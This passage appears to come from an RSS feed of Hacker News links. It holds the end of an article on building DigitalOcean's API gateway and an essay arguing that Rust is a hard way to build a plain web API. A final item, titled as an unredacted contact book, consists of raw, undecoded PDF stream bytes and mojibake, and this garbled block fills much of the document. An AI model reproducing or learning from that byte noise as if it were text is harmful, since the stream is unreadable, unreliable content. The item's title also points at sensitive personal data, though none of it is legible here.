<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</a></em></p>]]>
            </description>
            <link>https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800237</guid>
            <pubDate>Sat, 16 Jan 2021 05:14:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust is a hard way to make a web API]]>
            </title>
            <description>
<![CDATA[
Score 313 | Comments 384 (<a href="https://news.ycombinator.com/item?id=25798008">thread link</a>) | @tmcw
<br/>
January 15, 2021 | https://macwright.com/2021/01/15/rust.html | <a href="https://web.archive.org/web/*/https://macwright.com/2021/01/15/rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Rust is an amazing language. It has enabled excellent CLI tools like <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> and <a href="https://github.com/ogham/exa">exa</a>. Companies like Cloudflare are using Rust for their own systems and <a href="https://blog.cloudflare.com/tag/rust/">encouraging people to write Rust to run microservices</a>. Rust makes it possible to write really fast software that’s secure, tiny, and more concise than C++ or C.</p><p>If I were writing a geocoder, a routing engine, a real-time messaging platform, a database, or a CLI tool, Rust would be at the top of the list.</p><p>But last year, I spent some time trying to make Rust work for a plain-vanilla API to power a normal website. It wasn’t a very good fit.</p><h3 id="lots-of-missing-pieces">Lots of missing pieces</h3><p>Rust has a fair number of web server frameworks, database connectors, and parsers. But building authentication? You have only <em>very</em> low-level parts. Where Node.js will give you <a href="http://www.passportjs.org/">passport</a> and Rails has <a href="https://github.com/heartcombo/devise">devise</a> and Django gives you an <a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Authentication">auth model out of the box</a>, in Rust you’re going to build this system by learning how to shuttle a shared vec into low-level crypto libraries. There are libraries trying to fix this, like <a href="https://github.com/breard-r/libreauth">libreauth</a>, but they’re nascent and niche. Repeat for plenty of other web framework problem areas.</p><p>How about SDKs? In mainstream languages, you’ll be able to plug into Google Cloud services, AWS, or Stripe by bringing in an official library. Those libraries are mostly great. The <a href="https://aws.amazon.com/sdk-for-javascript/">aws-sdk-js</a> and <a href="https://stripe.com/docs/libraries">Stripe libraries</a>, for example, are incredibly well-designed and maintained.</p><p>Not so with Rust. There are a few third-party libraries trying to fill in the blanks, which is great, but with the sheer velocity of those services, will they really be able to give a quality experience?</p><p>Some people will say <em>well, X language is so good you can just write an SDK yourself in a weekend!</em> To which I must reply, no.</p><p>Rust’s ecosystem is rich in other domains. The crates for building CLIs, managing concurrency, doing really impressive operations with binary data and low-level parsers - they’re spectacular.</p><h3 id="rusts-compiler-is-faster-than-it-was-but-still-slow">Rust’s compiler is faster than it was, but still slow</h3><p>I’ve been reading <a href="https://blog.mozilla.org/nnethercote/2020/09/08/how-to-speed-up-the-rust-compiler-one-last-time/">Nicholas Nethercote’s</a> <em>excellent</em> blog for years now, in which he describes how the Rust team has made the compiler faster. And they certainly have made it faster!</p><p>But compared to other languages you build websites with, it’s slow. It’s much slower than the Go compiler and much, much slower than the startup time for interpreted languages like JavaScript, Ruby, and Python.</p><p>Once your code is compiled, everything’s amazing! But in my case, this basic API - which wasn’t even feature-complete and was by no means a complex system - took more than ten minutes to compile. On the weak hardware of <a href="https://cloud.google.com/cloud-build">Google Code Build</a>, it would run out of time, every time. We couldn’t build anything.</p><p>Caching helps as long as you don’t have to rebuild cached dependencies. And, I don’t know, maybe <a href="https://blog.kodewerx.org/2020/06/the-rust-compiler-isnt-slow-we-are.html">slimming down dependencies</a> would help Rust projects compile faster. But <a href="https://serde.rs/">serde</a>, for example - the JSON and other-format serializer/deserializer that nearly everyone uses - takes up a huge chunk of compile time. Should we replace serde with something that compiles faster but lacks great documentation and ecosystem support? It’s a bad trade.</p><h3 id="rust-is-complicated">Rust is complicated</h3><p>Rust makes you think about dimensions of your code that matter tremendously for systems programming. It makes you think about how memory is shared or copied. It makes you think about real but unlikely corner cases and make sure that they’re handled. It helps you write code that’s incredibly efficient in every possible way.</p><p>These are all valid concerns. But for most web applications, they’re not the most important concerns. And buzzword-oriented thinking around them leads to some incorrect assumptions.</p><p>Take, for example, Rust’s safety. This is a big part of the marketing, and it’s absolutely correct: Rust’s main promise is to be both <em>safe</em> and <em>low-level</em> - it works without a garbage collector, while at the same time protecting against memory-based exploits. When you read “safety”, think about Rust competing with C. Code in C can reference arbitrary memory, can easily overflow and segfault. Rust code can be just as fast as that C code, but protect that memory access, and without the cost of a garbage collector or some kind of runtime checking.</p><p>But Rust’s memory rules aren’t more secure than Node.js’s or Python’s. Your web application written in Rust isn’t going to be systematically more or less secure than an application in Python or Ruby. High-level languages with garbage collectors pay a performance penalty in exchange for generally dodging this whole class of exploits and bugs. You can’t reference uninitialized memory in JavaScript because you simply can’t reference memory-as-memory in JavaScript.</p><details><summary>Sidenote…</summary>This is describing the design goal of Node.js and other systems - they do occasionally have bugs that creep into this problem area. The <a href="https://github.com/nodejs/node/issues/4660">previous behavior of Node.js's Buffer object, for example, is a good read.</a></details><p>Heck, if you ask <a href="https://deavid.wordpress.com/2020/01/18/actix-web-is-dead-about-unsafe-rust/">some people</a>, Rust is <em>less secure</em> than a GC’ed language for web apps if you use any crates that have <code>unsafe</code> code - which includes Actix, the most popular web framework, because <a href="https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html">unsafe code allows things like deferencing raw pointers</a>.</p><p>If you’re writing a video game, a pause to run garbage collection is bad. If you’re writing code for a microcontroller, any memory “overhead” or waste is really bad. But most web applications can spare a little memory overhead in exchange for productivity.</p><p>This argument is pretty much the same for the other attributes of Rust. Its concurrency primitives are <em>amazing</em> if you’re doing something complicated and need blistering-fast performance. But if you aren’t? The Rust async ecosystem is challenging, to say the least: there are different sorts of async, projects that span domains to do async implementations of unrelated stuff like <a href="https://tokio.rs/">tokio</a>.</p><p>It feels a lot less like Node.js, which had a good async story but ugly syntax, than Python Tornado or Twisted, which had a weird async story and also ugly syntax.</p><p>Async, I’m sure, will stabilize and homogenize and be a lot easier to do in the future. But I was working in the present.</p><h3 id="the-rust-ecosystem-is-not-web-centric">The Rust ecosystem is not web-centric</h3><p>There are many people currently learning Rust, writing CLI apps or low-level code in Rust, and having an extremely fun time. There are dramatically fewer people using Rust to write plain-vanilla web applications.</p><p>This is an important part of the equation for technology choices: are there people working with the tool <em>and</em> are they roughly in the same domain? Unfortunately, a lot of the incredibly exciting work in the Rust ecosystem has nothing to do with web application servers. There are some promising web frameworks - even a <a href="https://github.com/iron/iron">somewhat higher-level framework</a> - but they’re undoubtedly in a niche. Even Actix, the main web framework, has a <a href="https://github.com/actix/actix-web/graphs/contributors">very top-heavy set of contributors</a>.</p><p>If Rust grows at its current rate, the web portion of the community will reach a sort of critical mass, but right - I don’t think there are enough people using Rust for websites for it to be a practical tool for websites. And compare to other communities in which there are entire companies dedicated to building web applications with existing tools - not cutting-edge work, but the kind of stuff that differentiates a mature technology from a new one.</p><h3 id="the-juniper-crate-invites-n1s">The Juniper crate invites n+1s</h3><p>This part isn’t just about Rust, it’s about the GraphQL ecosystem and Rust’s involvement in that ecosystem is one example.</p><p><a href="https://www.infoq.com/articles/N-Plus-1/">The <strong>n+1</strong> problem</a> is something that everyone building web applications should understand. The gist is: you have a page of photos (1 query). You want to show the author of each photo. How many queries do you end up with: 1, combining the photos &amp; authors, or a query per photo to get the author after retrieving the photos? Or 2 queries, with the second having something like <code>user.id IN ids</code> to fetch all authors in a single pass and then reconnect them to their photos.</p><p>n+1 queries are usually the highest-priority database fixes: they’re usually high-impact, and changing an n+1 query into a single query is usually a big win. And we have lots of ways to try and resolve them: you can write SQL and try to get a lot done in a single query using CTEs and JOINs, like we did at Observable, or use an ORM layer like ActiveRecord that has <a href="https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations">quick ways to turn n+1 queries into predictable queries</a>.</p><p>We were using <a href="https://github.com/graphql-rust/juniper">Juniper</a>, a <a href="https://graphql.org/">GraphQL</a> server for Rust applications. GraphQL basically lets your <em>frontend application</em> define queries, instead of the backend. You give it a range of things it could query, and the application - React or something else - sends arbitrary queries to the backend.</p><p>This makes things <em>hard</em> for the backend. Any sort of SQL-level optimization is impossible - your server is writing dynamic SQL, so you rely on the intelligence of your GraphQL server, which is not always high. Juniper, for example: n+1 queries by default. The workaround - <a href="https://graphql-rust.github.io/juniper/master/advanced/dataloaders.html">a dataloader</a> - is rough and independently maintained. So at the end of the day, you’re going to have a blisteringly-fast application layer that’s spending all of its time inefficiently querying your database.</p><p>The word is that GraphQL works really well with non-SQL databases which can serve these sorts of requests fast. I’m sure that there’s some special database used internally at Facebook that’s incredible in combination with GraphQL, but the rest of industry is pretty attached to Postgres and its ilk, <a href="https://info.crunchydata.com/blog/postgres-the-batteries-included-database">for good reason</a>.</p><h3 id="lets-have-some-caveats">Let’s have some caveats!</h3><p>So I tried to lead with the main caveat: this isn’t about Rust in general. It’s about using the language and its ecosystem for a particular goal. Simple web APIs.</p><p>The caveat to that: in the general sense, you can build a website with anything and be successful. Remember how OkCupid was <a href="https://github.com/OkCupid/okws">implemented in C++</a>. There’s a popular <a href="https://www.costarastrology.com/">astrology app, Co-star</a>, that’s all Haskell. If you’re great at writing some language and you can hire other people with lots of talent, you can do it and be heroes.</p><p>Another caveat: what I was trying to build was a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a>-heavy web application API for a website. It wasn’t a web “service” as you might call them nowadays, something that …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macwright.com/2021/01/15/rust.html">https://macwright.com/2021/01/15/rust.html</a></em></p>]]>
            </description>
            <link>https://macwright.com/2021/01/15/rust.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25798008</guid>
            <pubDate>Fri, 15 Jan 2021 23:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jeffrey Epsteins Little Black-Book Unredacted [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25797773">thread link</a>) | @DyslexicAtheist
<br/>
January 15, 2021 | https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf | <a href="https://web.archive.org/web/*/https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>½¨žm§q^÷KFÀÃš�nVëïÇ9©É�K*wIóE¡"þMv¨ëšö^u‹ÿ¤ŒRös””Ú¥¶µP¢°®YÝV¥PiöØ5Ô)šdÚqì\¼už¾r‰ÐP—?§˜&nbsp;ñ5ö�—bÒ=½XÎõÛ–*þ
0.F0ï
endstream
endobj
1159 0 obj
&lt;&gt;stream
H‰ŒT=Oë@ì-å?l	›Û½o	!ïÑÑ�”i¢€_òä�ÈI
ÄŸçÎäNÁÂraKÞ™Ù�Ù»âïóã¤˜ÎN‡ýÛê··ÓÇÝ{	âîþ„?…†ùjRTZ8á	ŸBh©Ñ3Bma¾�Wõ©&lt;–Öf»\áj·…k˜ÿŸ�†hhlÃ`A“Fc@ë@Û‚©+¾	’²×tÆ›Á�Jžl‡	A.�]Vm|W=<m£-dn¤,r¦Ë¤]:Ù0ßôé(€`^fcy”&éia0Ò„v9uøÜwcÖ©�;›÷nf­¿Ä„~hÛvâ»ifƒò “lÄ´Ù$˜s6…—t.•Í°i)ë¤tsÂ�Ïj½="" úß‘sx n5ã="">¦«i
›"?÷ãÂW|iH41#›-«êc\@±M¦¡6ƒÕD&nbsp;$zÙ¯§¼iK?ÀÙ¡’ÜÒ¨1Y¶¤-§œR9Ê6ùÞxÓaãIvÈ:.®ŽõG’–Ô´/’ºÞ~�#ö¡Ü¥ct™5å¦&gt;T‹ë,µ§5u‡'’éöÜO¦ø6Ìa{AJgkxî«×zóúï-¹y,]�@Òp¶,Ëz÷ÞÏu¾.�`#Ð!ß~åÔ7nÍ-¾’¢0Û
endstream
endobj
1160 0 obj
&lt;&gt;stream
H‰Œ“Mo1†ï+å?øX;õŒí±�ª
èÇ�TÑH\zYò!I¶jBâÏãõ®×ë*%UŽ´ó&gt;~=ïLÅà¥D!ÃoøËÄ€F(rÀ^Ìw³êÄŠ7bþcV�Þþz¼_-žÄÙÙéE»_y~.&gt;\^„/×OR&nbsp;˜¯g•©ŒóÅ¬²@‘Ü�¬”+°[Ø,¿=´?Wþês ÕA�ê€ž¸´õe™|]O·×ñúA-Ñû ¯€º#&gt;µûe»?ú¸Ðgmi£ÐWÄé:WX÷\ÔÍåè}Ú¹Ñ¹ÕC&amp;ŒSx‰PhÁrIÒÖ–,JÉ'öÍS¯ï¯ÎJ„à¿WÊä4ÖsY¯(.ê	©vÖ×–ÃÝÇ§&nbsp;È�è&gt;$`&gt;xŽì«]³Ù¾�6îeô$×0§š}bjŠa$æc³^ÿn¶ïšv‹v7…wŽX
�§^÷S�@&gt;p$�ÉM¾#2DX«ðý``È‰LÄugÇRZ�
�
m|ÿqõ§Ù/W¹ùä(Ùt“2UÞ4»¬Iãa(5Tï^BÈžØ�&amp;Q‡-Î·qZ)•^ž´Z©BËZÍztö‘Æíè‰&amp;.È”¨¤¹½;Ù¼&gt;k2)l—“rã[;¿:'…Ïrµh¨Ð*	ªÔæ.…oMQZc|QnÆòÿ¶É¾d¿kLo¥û{ÿºÞÄÿÂ¯/É
endstream
endobj
1161 0 obj
&lt;&gt;stream
H‰Œ”KoÛ0„ïôxlÞp—ï"ÐÚq/íÉz§u+K�«ýù%%Jc¸|ðš�3Ã]#Û¿”NZ±ý¡,4HÎ‘qÿŠ5q°Š‘²€‚íÏeñîñ\�êì=Ûÿ,‹Ç¯ë²¸Ûýùýz<tìþþnÝ6 Œ?<°o›õÀ&{‹-d†~­ºãßªy="">^–ão:·ÆføªŽôKûýTgGl Ã±tƒeëíbxEø–H(�jÀ}¬«KÕt§
B)¯…Þ€¶™ðó©:´ç6ênÇó®(¹‚*p&gt;YOW`z[J{:cú¶«.rY«àÙŽ`“¨Â€�2§Z±øJ¤Õ×DéãcFÜÔõ¯ãbè”íŒªýtæ&gt;wÝ›{å±Á�UŒÃ¢¸=Å
F$À‰7io{Ò€H4ƒ8ð¹ç�ÍSžOƒsÂ$…ÔàÏ™+vuš%é\4kÓdÛq'‘¡…ÛºêdÒ’ÒÿÙgô�!M�}i›ç¶‰â¬%4~â³…õÍåâo¸`Š;~½[¡�©	týŸ×aÅz.'nVÒeC¼ñ8­™\q�"“k48«Rk»Oç!Ðxžð?¤
(ÎÛ¤ð�:S�ž� âeMÏ{KÜfÏÇÓó\Ž1¦Š{o’¡&nbsp;ÝÔ…]9ÿ-ÉUˆý`ëå4ž
endstream
endobj
1162 0 obj
&lt;&gt;stream
H‰””Ok1Åïþ:&amp;�gF£%Ú4†
�ø˜‹	
Np’Brè—ïÈ«]K^ÒÔìa—Eï§÷fFê"Ô§|z‡ b(YðÉ¬gÝ	"sjV³nqýúû×ÏÛsv¶¸x~º3x~n¾|½˜uèÌêvÖpÎ·Hï!¥ys²¹/ÈË½š\(ú‰%JÕRL`C±ÄçA<q¤ÁÚrƒ†ÌêniÄ…Âj!bŒ âíÃh‹åËhäè{lí]9ezh{w!»ª“ÍuŠ‡rg�Žrö�Üd�íkìaØ¹l+Û—8iÊšùíæ´¶ñ¯”cÝòì¥ìá†6”Ï¡="" !äÜûÀódñ —èâ{�2^Ä´eŸ#f~oª7Òô6¦l›%v&ÍÁÀ€ÃtÛè÷Ûr¢v`="èhÕ±±²™ÿ6-E" nÖ3Å#›j8â<ƒÚ«q®¾7="" ]nhŸ—¨¯zÙò;gÖ¹"iÊp|Þn×oûÓt%hÕÕúu{äaaïê3Ž„�i¸uèÿ´ºyt®dlƒÄ†ÈØœ¼�dÓh@h³Úê="" +aÖ´3�Òêõ.„0½jvg†§7êf:bcó.×÷ÛoÇ�crÇ°ÚÊtÍ_�dÌ*p="" endstream="" endobj="" 1163="" 0="" obj="" <<="" filter="" flatedecode="" length="" 491="">&gt;stream
H‰Œ”[kÛ@…ßú›—’€5ÙÙûBmœ„ÒÒbÑ§¼,Š¹U$×—BèŸïêâxeEMHÚ‡ïÌÌ™#EÇK·-&gt;þÙ~É\	YõDNHú3Ž®¾Mãèô:G‚$}ˆ#
”J’fqd@ê¯ú©Ðß-Aäþ�&gt;ÅÑñ§¢på¤ñ“vH	V„Ô÷Eö«c|Mº«9$•„^¹{*ìÔ¨!ªH²3·rù°jRhltƒëfN­	R
¢£•Ü¡³íz9Ï6äììtZ•„žŸ“‹Ëi«Ä˜è+1ßö”.\ùìÊžïÿ—¼/)ë‘BÅ¿…u¨ØZ©@PŠ
Ö½6Db(Ó²v¿;D;†1¨Bl¶qe1~Ó“&amp;jLVhP"”m&amp;yœ÷FÊõ¨‚¦€:T¸­Üý{º’�¢¤ÞÞ‡8'Æ³­âçjýû&nbsp;!äf¬!®€‹ÿZ•�“—Ømè&gt;¶LÙAê|_†ƒä-Kib$Kò„jÅ^
?ªWÂ�º^³òæðÝwºÉ«ÕrnÛ9-ô€›ænU,æo:LVg–¿Øk|nšñ›¶¸%’�Ô][GGùÍjyð
&lt;âG£¬ëE	”�[Œê„±0Ñv”$i”š¿'8(å˜¦`t¨ù7¿;	g»Jãˆü`�'|
endstream
endobj
1164 0 obj
&lt;&gt;stream
0˜¤@&amp;‡˜¤ÿýÿþþþ¬£'Sîq–?ÚÒ*Øþ]ÌBž
‘¿d&nbsp;æ@Ì”^v1`ÁD¸òú‰@jgUyÒË·®¶ôº7§¹°PÐœkmá—çô'G,2EbZ@¹—v2¶_0¦Ý”fsìn—yçlÑÁ‹¹Ì7æ,´€$Ûñò×ùÅÅ¯f°ÅH½†WÏÅh›å=ËÅ‘ÄU¼Te6‚üêÊ¼æ…@¢Šò‹œ+ ;y¾lFpÐ¥òúhÈ¹ý:%¤P÷kAÀð¿’º··[vÄì•«.µh¹õzmÐê–ÂHìÞBZ*;&nbsp;\¡JÂ¿ý˜ûRÇ&gt;æLì/LùvÖü	"Ä��ödCŽ&gt;™ê„#r4;µXä—(\4Ý†Îµ�íN\ç6GRúà‡@ºœåkäc¶Î{]ñ®Èîñ’+æ…Z]&gt;Õ96 +Oêö¼(.3÷"ÉoÓ§Báá£¢8 –A7Š.i˜ü¨ôˆ¦vKËZ’)óxÜ¤÷;7ñ¢ÒlÓÖø4—k"Ÿ ¿•ÉU**ÒáÏfˆ„‡æ1ÓŽw_`
¬÷Ç8'G·Õ„æ0c0‡c‹AÂ™ÉÒ]Y×"%Ÿôøù©ß.òÓ&nbsp;o‰waþádˆ¬xßShÖZL™‹âC©ø56¡¢«AÂ¯ˆÌ)ï‡s@o_�ÿYO——C‘
AÒë—byéLç0|Œ¤!Ðª™J,GEÃ
w�õ�YÒ7©ë2¸å³Gk?uu”¦\�*Ð9ýŽkMDÇ\ÑBËK¾6�î°´©ñ|ÇbÏw‡4µ$×ÀÚý‰&amp;†.[gc�jCg´çòï!IaGMQ&amp;Ô­´��Hg
R qàræ+¤=¿èôH­ ™6’Â·�¼ÛFYMßqcu,d}I¢`_în—':ÍÈ–†bk@îâoÑþíõLHæôCnjªV³[@™Ò¶×mÎ¼	&gt;0±€ÉjSÛ&amp;˜]NªNˆ¥è{�\HÅýÔ�«ú85ÝS¥yœ0òu"Á«	9åãQnux[a&nbsp;ÿeBï‘µø‡{àê¸/Wê!TAö¹ÉLäÐƒÕµj7Œ*gðƒl"«a�ch
X=±#Djº&gt;âò+ðø¸÷&gt;n�B_;¶ÊW7‚²FŸq¯#´]ßDÁO¡’	@QŒz–„ Ê·ÊÅ0´Â@ˆõÀŸÏ
Obìjd]zÙz«½PíÖ¯*ÇÍ�JÅtå"Í0C¡aÆ¾µ´‰¦ÍØgTilîhfh6cA€¦àz[™ˆcD'Ïœ•[hÆDÃ$/Äï0‡…f¼;Çô�’U*ÿ?ÊˆòéÔ6bVm†O)
ýUþtBL‘þdut’Òà˜ßû5Xnä$»g	k=[…Íg	ôVg(ú,Ñ£‰åÑXœxÖ�ç‰5øõútYº
úfÖ¼Øºv�«rãøÙwÖ�|û¹óä„%1^™Ø»h,@,¬&nbsp;~Í@…£wù&amp;Ûl¸&nbsp;¸PåC8Ô(ý}üpÂ›àÁ!s
©_aÞcøÈÆUˆzÊh‘3†hWè+�•�Ké“ÁåC½dxª…TsÔ•ÇÝžt­ßùÎoD2¹i;(5ÙÐ¬¸]ð˜ÕµTð±Ž8]Ä&amp;ÊÅÅ¡‰F(â¤ø¦H/Äól•º@Ì¸×-ît�%‹¯îye fÁ¢}¾~Ü²ÆðV·{�#Q¹kV~·Àm´,�×ãgÑ_xgÓ¥ÇÅeÝ¬vxÖ�LòÕ�Xþ—	á‰A×F3Ñ+˜U¡z¦cÅÛŸ@LÎ#Ÿ¸)¶ˆÝ�a\�7äT†~ˆZaz:¾’U!ZO\ÐŒn6ÏI[ò2 Ôq„6~}‹%Ñ£.ì‹«ÃÉFØ¥At‚‹õ·å!Æ„:v¾p±ö)¤ˆm&gt;YNg�‹oüyÕÄ^þ†VºÁì·a$ž«5"žIü	Z€É¾ÈìÉ°ŽØD³Í%7ÿ2ü2om&nbsp;­8`t¬£¥ÎQ=(Ÿ„ ÝÞA2ÿnnÍý—ÙÒ`N#5
Á0³…Ë³Xñ,
¥±:‹RÿKÝ…Øã–ð+·399Ò&amp;‡ðg‚Ãnw„ð�›öK%­+Zã–wÌÀs 	O—^–¥BOá&nbsp;ÓûJ«�‘ênŒ&lt;}Â×î¬ÛF™ÿ=Q£˜ÀQ&lt;;™Æ–Òv­ª)õq’ü¡^P¹ç‡ðH€/VŒjØÉ:Ò¥ºYÀ˜XãGk»2.1}šßnzÅQd—jWv	·â¢Þ—L!ãðÕ~râ»Í&amp;Ôý½„5Ÿm_[Ú]¹KürþCƒ�Œ&amp;v¡ªRÆ5roÚäîø©º¶)SêÒÞ,S·‘}ý»Uðêÿ&lt;´ç‘þg5”)ü?¿t÷˜î�«(’%q �u©9†ÊÂE�gQ‹õƒußÎ�7ª`ôC"¹Ç³æú&amp;ÐþWý‘iËbDâ.ºŒìëdnÆ5�tÿ[ëµk˜v“è0fÝø«_‹þ¼ÞWIâòïÞ‚Cðqÿ:ÙYú„—«bœüŸ¾`}ÑA�Ú`"yóµQ&nbsp;L¸¼
þ}^<v±¬giu•-_×rÚ#[ýÿ=�¹òs•Â)eýÆy÷7<‰Ø¬l±ô"f>sëtæËy—õ‡`™bs“«5ýâl¤î­!âU'OÔé\šT®’§úi‡cßLÞ)ng&gt;Pï&nbsp;J,”cÊérñ?Ž�á‹³S&lt;Í»|vE™Œ}•¿V»Pó³+œÑ—GÖ\6R¶^@”QÀ¼d&gt;8/h\ñþïÚ„&gt;Û@ü$©H�.ð™çYÈ‹8”ÇÙ¬ùÃ‡0ü|E	Y‚Lª¾Ì¤¢(G74e™üÉ~gœócLÓÝxíUC×&nbsp;£íØ–0!$Dë{ŒäÔšª:Ò
ÒkÑ«
Â­)t#RÞñm©ÅFUJ¼2¦Åñª,‡1Y°äÜFãXÌæš63X(ŽÀ3Ó³¸èû‰ï4íÓÜ&amp;•w´TïßC`å�°ÜIìÇiÌÎT÷#o®×bGcœñ8‚çp‹Í`3<jpäíw”<âp 3Àjè*¢!�[õ€+å‚@Ã°| õ¼Ž="Ôp#çúJs_7)î[Ä­A�Þ”tŸHó%ÞL" òî¥|="" %{?Žn˜="" Ÿ²÷y¥r3ç³ý5‚~pkøu="" qõ¶j~ä©gmgØ±-—#="" tèeŒàa‚��…°ké9Áy•·~Æb¨^cÆ¢˜u$)4„¬m�3Ä´j2¦Ž="" ÐÒòžiÁ¤Ô"^ôÓÉj6¹Òôrÿ„$Š—lÈ{Œ^ßåvÔyÔg¡¾è!pŸiúÇ}Ô[,zŠèß;md‘;ÝŸnt"+<ÊÚt*á²e¦b7½û\Å�mÀt—ÎÔb¢æÍyœ@dÚ­ðªiþjfß~ß`òz§ðåwÃ›ázö]h="" ˜hú%­@&Ò~’wÁá(]s·="" +’…ˆ�”ßgt[•i)Ö©c!×aÅØíb½¸›¾¹°ÿ&#uýëdÞÓh&1úš�àÄÎ?þ…1"Èz‚ˆ£`ââÚ£¾nacíë€£ÈØÑr="ÈÞ„$Ð´Õºcm^BX“þD±²Ý[Pp&quot;,Ï@&amp;lõ¸ÙqÄQYUÓÿW*vœRì›3zHOêINZ¿Scûûkä&amp;ö¨†òöxxo§¢¬1ÊÉŠ[@Q‘c¿þå!‚ùª÷’¸" ¸’="rgTÈT%óXŠËø†¨ž?×í]µK¥p¡�ëôìá~né7Þ+¿¾D›â¬Ä¬]“L|¤�…2§0d·Š¬Â¼££^à/Tr,GÑ/éiTÜ:º™ufë^Ûï%ö©b¶žÎ.ÕSþ;=#d&nbsp;;" ÚÕyú6@ž¾lŠoýe›§06úo}ll="í,²" Îä§ÍcëdŒ·-¸="">4b.Úœx¡$Øç…Ô¨EWs�-Qn×‘f=ÑTÈ˜`mô‘þ…!ºttˆ
6šõ6O�Pƒ“ö‘û,»Cãl?
{Ó+s¯37öTo"�ãé£‡ì3\fGã¸4¤€wHÙ»&nbsp;qí]¢v+íV6»ƒì¸%UêÇqú˜(‡á@?ªW·ýï0n±e,ýº7ÏØÊ/¥Rs÷,*Ó7Fûá«Ì£3T¶‹ïÊI#­.±ž,€¤‰&amp;HØÔS—	=�”Ýú—±
”\Ö–‰�‡ÀÜÄrÁGÇŽ|–JbËOU’…ê&amp;V–yàÂ·u›óÄ”8gbœóŠw©Iè¶G”»B»–¸˜[Yï"XÉ~;8ÉêëŠ+e<d<ÎjtdäÐ$w %Ò\ms§0¼aÒª7e™²l k~b‚lqÉ‰�¾wøöÁØ(Ûx�gÊÖ¹4Î›‰v‡íÎ6qtï3ÈúšgvuåûòÏ2ubà#0`ƒ4s="">�é/H¼ª	$¦8D*D�oÄuo+¬¥ºÙ�^œ¼ÿn3Ïoéy”S¥&nbsp;ØYcç•;‚
„©F)BG±bìé¸ÓrË{ŽE½â,t°Îù¡ÏM,_Ê;ÝýŽÉxå´_RMhf¬špfßVjså™Q®±¾—ˆ§‰BRðTcÇï-ÿNmKDŒ73Ãp_Æu¨y%¬Þ›®Ñw"/rE~OøÌ²ÏÒ�x&lt;žP@úJà5®ô1ÿB‘E[²s	³Á;}ßy¿ ›üÑõháâŽ”Ãß³þMê‘-Ü6×Œ‘(:4Ñ¼.+ù}½õúÜ}Ú–e”A"€+í^¦g{é�Ó²'TéŒ7LÈ!7^Î‡[…éÃ} ¾F{««4Û*0ÙÖàoÀã“+jÎªg»ŒÖA&gt;Uzºqe»ákF@t/ÙPÕ‡Or¡¼À^‚§lYÜ‰åTSh¹
